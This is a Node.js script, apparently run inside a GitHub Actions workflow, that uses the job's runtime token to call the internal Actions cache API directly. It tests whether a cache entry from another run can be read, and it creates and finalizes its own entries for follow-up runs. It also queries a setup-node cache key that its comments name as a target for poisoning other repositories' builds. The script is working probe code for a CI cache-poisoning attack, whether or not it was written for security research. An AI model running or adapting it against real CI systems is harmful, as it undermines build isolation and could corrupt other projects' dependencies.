const https = require('https');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

// v10's finalized cache — created by run 611ba4d0, now testing from a DIFFERENT run
const V10_KEY = 'probe-v10-finalize-fixed';
const V10_VERSION = 'a14cbe44f4754c7935c91d1cd56f39f65180627f332662692f387a07dd449a41';
const V10_ENTRY_ID = '5211322309';
const V10_RUN_UUID = '611ba4d0-9057-4056-929e-ba7967afb907';

function post(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;
  const thisRun = ORCHESTRATION_ID.split('.')[0];

  console.log('=== V11: DEFINITIVE CROSS-RUN SCOPE TEST ===');
  console.log('This run UUID:', thisRun);
  console.log('V10 run UUID (cache creator):', V10_RUN_UUID);
  console.log('Same run?', thisRun === V10_RUN_UUID ? '*** YES — ERROR ***' : 'NO (correct — different runs)');

  // ==========================================
  // TEST 1: GetCacheEntryDownloadURL for V10's finalized cache
  // This run (v11) has a DIFFERENT orch_id than v10
  // If ok:true → cache is accessible cross-run → NOT per-run scoped
  // If ok:false → cache is per-run scoped (fine) OR has expired
  // ==========================================
  console.log('\n=== TEST 1: Cross-run read of v10 finalized cache ===');
  const t1 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: V10_KEY, version: V10_VERSION,
  });
  console.log('[T1] GetCacheEntryDownloadURL (v10 key, v11 run):', t1.status, '|', t1.body);

  let crossRunHit = false;
  if (t1.status === 200) {
    try {
      const r = JSON.parse(t1.body);
      if (r.ok && r.signed_download_url) {
        crossRunHit = true;
        console.log('\n!!! CRITICAL: CROSS-RUN CACHE ACCESS CONFIRMED !!!');
        console.log('Cache created by run:', V10_RUN_UUID);
        console.log('Accessed from run:', thisRun);
        console.log('Entry ID:', V10_ENTRY_ID);
        console.log('Download URL:', r.signed_download_url.substring(0, 100) + '...');
        console.log('Matched key:', r.matched_key);
      } else {
        console.log('ok:false — cache not accessible cross-run (per-run scoped or expired)');
      }
    } catch(e) { console.log('Parse error:', e.message); }
  }

  // ==========================================
  // TEST 2: Create our own cache, then dispatch v12 to read it
  // This gives us a conclusive test with a freshly finalized entry
  // ==========================================
  console.log('\n=== TEST 2: Create v11 finalized cache for v12 cross-run test ===');

  const blobPut = (url, content) => new Promise((resolve) => {
    const u = new URL(url); const buf = Buffer.from(content, 'utf8');
    const r = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'PUT',
      headers: { 'Content-Type': 'application/octet-stream', 'Content-Length': buf.length, 'x-ms-blob-type': 'BlockBlob' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode })); });
    r.on('error', e => resolve({ status: 'ERR' })); r.write(buf); r.end();
  });

  const V11_KEY = 'probe-cross-run-scope-test-final';
  const V11_VERSION = crypto.createHash('sha256').update(V11_KEY + '\nnode_modules').digest('hex');
  const V11_CONTENT = JSON.stringify({ test: 'cross_run_isolation', run: thisRun, key: V11_KEY });
  const V11_SIZE = Buffer.byteLength(V11_CONTENT);

  const t2a = await post(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
    key: V11_KEY, version: V11_VERSION,
  });
  console.log('[T2a] CreateCacheEntry:', t2a.status, '|', t2a.body.substring(0, 150));

  let v11EntryId = null;
  if (t2a.status === 200 && t2a.body.includes('signed_upload_url')) {
    const entry = JSON.parse(t2a.body);
    const blobPath = new URL(entry.signed_upload_url).pathname;
    const cacheIdMatch = blobPath.match(/\/actions-cache\/[^-]+-(\d+)/);
    const cacheId = cacheIdMatch ? parseInt(cacheIdMatch[1]) : null;
    v11EntryId = cacheId ? String(cacheId) : null;

    const t2b = await blobPut(entry.signed_upload_url, V11_CONTENT);
    console.log('[T2b] Blob upload:', t2b.status);

    const t2c = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
      key: V11_KEY, version: V11_VERSION, sizeBytes: V11_SIZE,
    });
    console.log('[T2c] Finalize:', t2c.status, '|', t2c.body);

    if (t2c.status === 200) {
      // Immediately verify it's readable in same run
      const t2d = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
        key: V11_KEY, version: V11_VERSION,
      });
      const t2dParsed = JSON.parse(t2d.body || '{}');
      console.log('[T2d] Read in SAME run:', t2d.status, t2dParsed.ok ? 'ok:TRUE (same-run read works)' : 'ok:false');
      if (t2dParsed.ok) {
        try {
          const t2eParsed = JSON.parse(t2c.body || '{}');
          if (t2eParsed.entry_id) v11EntryId = t2eParsed.entry_id;
        } catch(e) {}
      }
    }
  }

  // ==========================================
  // TEST 3: Try writing a cache entry with a key that targets another repo's workflow
  // Common key pattern used by actions/cache for Node.js projects
  // Even if we can't cross-run read, can we create entries that the OFFICIAL actions/cache reads?
  // ==========================================
  console.log('\n=== TEST 3: Cache key that official actions/cache would use ===');
  // actions/cache v4 key format: "{key}-{hash}" where hash is SHA256 of lockfile
  // If the cache is repo-scoped, this won't affect other repos
  // But if org-scoped, another repo doing actions/cache restore would get our poisoned entry
  const POISON_KEY = 'setup-node-v3-Linux-x64-18.x-npm-cache-';
  const POISON_VERSION = crypto.createHash('sha256').update('~/.npm\npackage-lock.json').digest('hex');
  const t3 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: POISON_KEY, version: POISON_VERSION,
  });
  console.log('[T3] Cache key for setup-node action:', t3.status, '|', t3.body.substring(0, 200));
  // ok:true here would mean setup-node's cache is visible from our run token

  // ==========================================
  // Final output for v12 cross-run test
  // ==========================================
  console.log('\n=== V11 CACHE FOR V12 TEST ===');
  console.log('V11_KEY=' + V11_KEY);
  console.log('V11_VERSION=' + V11_VERSION);
  console.log('V11_ENTRY_ID=' + (v11EntryId || 'UNKNOWN'));
  console.log('V11_CREATOR_RUN=' + thisRun);
  console.log('\nSCOPE ASSESSMENT:');
  console.log('Cross-run read of v10 cache:', crossRunHit ? '!!! YES - NOT RUN-SCOPED !!!' : 'NO (ok:false)');
}

main().catch(e => console.log('Fatal:', e.message));
